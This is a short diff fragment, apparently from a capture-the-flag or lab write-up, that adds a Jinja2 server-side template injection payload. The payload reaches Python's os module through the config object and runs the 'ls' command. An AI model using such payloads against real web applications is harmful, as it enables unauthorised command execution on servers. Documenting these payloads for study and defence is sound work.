@@ -246,5 +246,5 @@ We are root.
 
 Aa2
 ```
-a{*comment*}b
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
 ```
